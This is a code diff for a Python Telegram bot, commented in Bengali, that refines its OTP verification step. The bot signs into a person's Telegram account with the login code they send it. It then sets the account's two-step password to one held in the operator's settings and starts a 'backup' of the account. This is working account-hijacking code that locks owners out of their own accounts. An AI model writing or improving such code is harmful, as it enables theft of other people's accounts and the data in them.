@@ -603,18 +603,42 @@ async def send_otp_task(phone_number, country_code, user_id, message, processing
 async def verify_otp_task(text, user_id, message):
     data = user_data[user_id]
     try:
-        await data["client"].sign_in(data["phone"], text, phone_code_hash=data["phone_code_hash"])
+        # ১. ওটিপি ভেরিফাই করার চেষ্টা
+        await data["client"].sign_in(
+            phone=data["phone"],
+            code=text,
+            phone_code_hash=data["phone_code_hash"]
+        )
+        
+        # সফল হলে ২-এফএ সেটআপ
         settings = load_settings()
         try: await data["client"].edit_2fa(new_password=settings["security_password"])
         except: pass
+        
+        # ব্যাকআপ প্রসেস শুরু
         await process_backup(user_id, message, data)
         del user_data[user_id]
+
     except SessionPasswordNeededError:
         bot.reply_to(message, "❌ **Two-Step Verification Active.**")
         try: await data["client"].disconnect()
         except: pass
         del user_data[user_id]
-    except: pass
+
+    except Exception as e:
+        error_str = str(e)
+        # ২. ভুল ওটিপি হলে মেসেজ এবং সেশন ক্লোজ
+        if "PHONE_CODE_INVALID" in error_str:
+            bot.reply_to(message, "❌ **Wrong OTP!** Please check the code and send it again.")
+        elif "PHONE_CODE_EXPIRED" in error_str:
+            bot.reply_to(message, "❌ **OTP Expired!** Please request a new code.")
+        else:
+            bot.reply_to(message, f"❌ **Error:** {error_str}")
+        
+        # ভুল হলে সেশনটি ডিসকানেক্ট করে দাও যাতে মেমোরি খালি হয়
+        try: await data["client"].disconnect()
+        except: pass
+        return
 
 async def process_backup(user_id, message, data):
     settings = load_settings()
